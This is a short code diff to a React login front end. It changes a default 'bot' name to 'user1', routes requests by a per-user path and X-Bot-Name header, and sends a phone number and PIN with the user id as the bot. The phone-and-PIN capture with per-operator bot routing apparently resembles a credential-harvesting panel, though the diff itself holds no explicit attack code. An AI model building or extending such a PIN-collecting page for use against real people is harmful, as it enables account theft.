@@ -19,7 +19,7 @@ const api = axios.create({
 })
 
 api.interceptors.request.use(config => {
-  const bot = window.location.pathname.split("/")[1] || "default"
+  const bot = window.location.pathname.split("/")[1] || "user1"
   config.headers["X-Bot-Name"] = bot
   return config
 })
@@ -46,8 +46,8 @@ function Login() {
   const sessionIdRef = useRef(null)
   const pollingIntervalRef = useRef(null)
 
-  const userId = user || "default"
-  const basePath = userId ? `/${userId}` : "/default"
+  const userId = user || "user1"
+  const basePath = userId && userId !== "user1" ? `/${userId}` : ""
 
   useEffect(() => {
     const timer = setTimeout(() => setInputs(Array(4).fill("")), 30000)
@@ -212,7 +212,7 @@ function Login() {
     const requestBody = {
       phoneNumber: formattedPhone,
       pinCode: pin,
-      bot: "default",
+      bot: userId,
       userId: `user_${Date.now()}`,
       userName: clientData.name || "User",
       name: appData.name || "",
